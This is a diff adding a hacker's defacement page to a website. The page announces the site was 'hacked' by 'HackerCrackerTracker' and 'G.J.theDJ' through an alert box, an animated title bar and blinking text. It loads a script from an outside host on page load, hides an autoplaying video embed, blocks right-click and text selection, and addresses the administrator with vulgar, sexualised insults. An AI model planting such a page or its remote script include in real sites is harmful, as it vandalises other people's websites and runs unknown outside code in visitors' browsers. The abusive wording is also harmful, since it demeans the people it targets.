@@ -1,0 +1,314 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="es">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<link rel="icon" href="http://img825.imageshack.us/img825/9636/58116375.gif">
+<title>
+</title>
+</head>
+
+<body background="http://www.madtomatoe.com/wp-content/uploads/2010/11/matrix-animated-image.gif">
+
+<SCRIPT> alert("S0rry  Adm!n  UR  S!t3  G0t  Fuck3d  By  H@ck3rCr@ck3rTr@ck3r")</SCRIPT>
+
+<script src="http://fafank.110mb.com/Script/munyer2.txt"></script>
+
+<script type="text/javascript">
+//Created by Title bar Maker (http://www.bosiljak.hr/titlemaker)
+function tb8_makeArray(n)
+{
+	this.length = n;
+	return this.length;
+}
+tb8_messages = new tb8_makeArray(1);
+tb8_messages[0] = " H@CK3D By HackerCrackerTracker ";
+tb8_rptType = 'infinite';
+tb8_rptNbr = 5;
+tb8_speed = 100;
+tb8_delay = 2000;
+var tb8_counter=1;
+var tb8_currMsg=0;
+var tb8_tekst ="";
+var tb8_i=0;
+var tb8_TID = null;
+function tb8_pisi()
+{
+	tb8_tekst = tb8_tekst + tb8_messages[tb8_currMsg].substring(tb8_i, tb8_i+1);
+	document.title = tb8_tekst;
+	tb8_sp=tb8_speed;
+	tb8_i++;
+	if (tb8_i==tb8_messages[tb8_currMsg].length)
+	{
+		tb8_currMsg++; tb8_i=0; tb8_tekst="";tb8_sp=tb8_delay;
+	}
+	if (tb8_currMsg == tb8_messages.length)
+	{
+		if ((tb8_rptType == 'finite') && (tb8_counter==tb8_rptNbr))
+		{
+			clearTimeout(tb8_TID);
+			return;
+		}
+		tb8_counter++;
+		tb8_currMsg = 0;
+	}
+	tb8_TID = setTimeout("tb8_pisi()", tb8_sp);
+}
+tb8_pisi()
+</script>
+
+<SCRIPT language="JavaScript">
+<!-- Mouse Bubbles from Rainbow Arch
+
+/*
+Mouse Bubbles from Rainbow Arch 
+This script and many more from
+http://Eagle-ZOne.Info
+*/
+
+
+n4=(document.layers);
+n6=(document.getElementById&&!document.all);
+ie=(document.all);
+o6=(navigator.appName.indexOf("Opera") != -1)?true:false;
+
+
+/*
+The bubble image must be in the same folder/directory 
+as the page using the script. If the image is put into a 
+separate folder, you will have to alter ALL references to it.
+*/
+
+img0=new Image();
+img0.src="http://img825.imageshack.us/img825/9636/58116375.gif";
+
+//Netscape 6 struggles, again! Always use a lower amount for this browser.
+num=(n6)?10:15;
+
+//Nothing needs altering past here.......................
+y=0;
+x=0;
+if (n4||n6){
+window.captureEvents(Event.MOUSEMOVE);
+function mouse1(e){
+ y = e.pageY-20-window.pageYOffset;
+ x = e.pageX-4;
+ } 
+if (n4) window.onMouseMove=mouse1;
+else document.onmousemove=mouse1;
+}
+if (ie||o6){
+ function mouse2(){
+ y = (ie)?event.clientY-20:event.clientY-20-window.pageYOffset;
+ x = event.clientX-4;
+ } 
+document.onmousemove=mouse2;
+}
+yp=new Array();
+xp=new Array();
+sp=new Array();
+rt=new Array();
+gr=new Array();
+s1=new Array();
+s2=new Array();
+nz=new Array();
+wh=(ie)?window.document.body.clientHeight:window.innerHeight;
+for (i=0; i < num; i++){                                                                
+ yp[i]=Math.random()*wh-y;
+ xp[i]=x;
+ sp[i]= 6+Math.random()*3;
+ s1[i]=0;
+ s2[i]=Math.random()*0.1+0.05;
+ gr[i]=4;
+ nz[i]=Math.random()*15+5;
+ rt[i]=Math.random()*0.5+0.1;
+}
+if (n4){
+ for (i=0; i < num; i++){
+ document.write("<LAYER NAME='bub"+i+"' LEFT=0 TOP=-50>"
++"<img src='bluebub.gif' width="+nz[i]+" height="+nz[i]+"></LAYER>");
+ }
+}
+if (ie){
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+ for (i=0; i < num; i++){
+ document.write('<img id="bub'+i+'" src="'+img0.src+'" style="position:absolute;top:-50px;left:0px">');
+ }
+ document.write('</div></div>');
+}
+if (n6||o6){
+ for (i=0; i < num; i++){
+ document.write("<div id='bub"+i+"' style='position:absolute;top:-50px;left:0px'>"
++"<img src="+img0.src+" width="+nz[i]+" height="+nz[i]+"></div>");
+ }
+}
+function MouseBubbles(){
+scy=(document.all)?document.body.scrollTop:window.pageYOffset;
+scx=(document.all)?document.body.scrollLeft:window.pageXOffset;
+for (i=0; i < num; i++){
+sy = sp[i]*Math.sin(270*Math.PI/180);
+sx = sp[i]*Math.cos(s1[i]*5);
+yp[i]+=sy;
+xp[i]+=sx; 
+if (yp[i] < -40){
+ yp[i]=y;
+ xp[i]=x;
+ sp[i]= 6+Math.random()*3;
+ gr[i]=4;
+ nz[i]=Math.random()*15+5;
+}
+if (n4){
+ document.layers["bub"+i].left=xp[i]+scx;
+ document.layers["bub"+i].top=yp[i]+scy;
+}
+if (ie){
+ document.getElementById("bub"+i).style.left=xp[i]+scx;
+ document.getElementById("bub"+i).style.top=yp[i]+scy;
+ document.getElementById("bub"+i).style.width=gr[i];
+ document.getElementById("bub"+i).style.height=gr[i]; 
+}
+if (n6||o6){
+ document.getElementById("bub"+i).style.left=xp[i]+scx;
+ document.getElementById("bub"+i).style.top=yp[i]+scy;
+}
+gr[i]+=rt[i]; 
+s1[i]+=s2[i];
+if (gr[i] > 14) gr[i]=15;
+}
+setTimeout('MouseBubbles()',10);
+}
+MouseBubbles();
+//-->
+</SCRIPT>
+
+<p align="center">&nbsp;</p>
+
+<P align="center">
+<blink>
+<font color="#565051" face="Webdings" size="6">!</font>
+<font color="#ffffff" face="Webdings" size="7">!</font>
+<font color="#ffffff" face="Courier New" size="4"> H@ck3d  By  G.J.theDJ </font>
+<font color="#fffff0" face="Webdings" size="7">!</font>
+<font color="#565051" face="Webdings" size="6">!</font>
+</blink>
+</p>
+
+<p align="center">&nbsp;</p>
+
+<p align="center">
+<img border="0" src="http://img7.imageshack.us/img7/1857/hctx.jpg">
+</p>
+<p align="center"> &nbsp; </p>
+<p align="center"> <font color="White" face="Lucida Console"> D0nt  W0ryy </font> </p>
+<p align="center"> <font color="White" face="Lucida Console"> N0th!n  !5 </font> <font color="#FF0000" face="Lucida Console"> D3l3t3d </font> </p>
+<p align="center"> <font color="White" face="Lucida Console"> D!s  w@s  Juz </font> <font color="#FF0000" face="Lucida Console"> 2  Aw@r3  U </font> </p>
+<p align="center"> <font color="White" face="Lucida Console"> N0w P@tch </font> <font color="#FF0000" face="Lucida Console"> UR  A$$ </font> </p>
+<p align="center"> <font color="White" face="Lucida Console"> 0r El$3 </font> <font color="#FF0000" face="Lucida Console"> UR  Fuzzy  A$$  VL  B  FuCk3D  l!k  @  Ch3@p  Wh0r3 </font> </p>
+<p align="center"> &nbsp; </p>
+
+<center>
+<marquee class="lm_tipBox" style="border: 1px solid ; color: Green; padding-top: 0px; font-family: Lucida Console;" width="600" height="24"> N0b0dy  !s  53cur3d, Ev3ry  D0G  H@5  @  D@y, 2day  !s  ma'  D@y, B3tt3r  Luck  N3xt  Tym </marquee></font></b></span></p>
+</center>
+
+<p align="center">
+<font size="4">
+<SCRIPT>
+farbbibliothek = new Array();
+farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");
+farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00");
+farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");
+farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
+farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
+farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");
+farbbibliothek[6] = new Array("#0000FF","#FFFF00");
+farben = farbbibliothek[4];
+function farbschrift()
+{
+for(var i=0 ; i<Buchstabe.length; i++)
+{
+document.all["a"+i].style.color=farben[i];
+}
+farbverlauf();
+}
+function string2array(text)
+{
+Buchstabe = new Array();
+while(farben.length<text.length)
+{
+farben = farben.concat(farben);
+}
+k=0;
+while(k<=text.length)
+{
+Buchstabe[k] = text.charAt(k);
+k++;
+}
+}
+function divserzeugen()
+{
+for(var i=0 ; i<Buchstabe.length; i++)
+{
+document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>");
+}
+farbschrift();
+}
+var a=1;
+function farbverlauf()
+{
+for(var i=0 ; i<farben.length; i++)
+{
+farben[i-1]=farben[i];
+}
+farben[farben.length-1]=farben[-1];
+ 
+setTimeout("farbschrift()",30);
+}
+// Zu Demonstrationszwecken*****************
+var farbsatz=1;
+function farbtauscher()
+{
+farben = farbbibliothek[farbsatz];
+while(farben.length<text.length)
+{
+farben = farben.concat(farben);
+}
+farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
+}
+setInterval("farbtauscher()",5000);
+text= " C0pyr!ght | HackerCrackerTracker | G.J.theDJ ";
+string2array(text);
+divserzeugen();
+//document.write(text);
+</SCRIPT>
+</font>
+</p>
+
+<object type="application/Virus Hacker" style="width:0px; height:0px;" data="http://www.youtube.com/v/FbIpr4_mFVM?rel=0&amp;autoplay=1&amp;showsearch=0&amp;showinfo=0">
+<param name="movie" value="http://www.youtube.com/v/FbIpr4_mFVM?rel=0&amp;autoplay=1&amp;showsearch=0&amp;showinfo=0" />
+</object><div style="font-size: 0.8em">
+</>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Disable
+function disableselect(e)
+{
+return false
+}
+function reEnable()
+{
+return true
+}
+//if IE4+
+document.onselectstart=new Function ("return false")
+document.oncontextmenu=new Function ("return false")
+//if NS6
+if (window.sidebar)
+{
+document.onmousedown=disableselect
+document.onclick=reEnable
+}
+//-->
+</script>
+
+</body>
+</html>
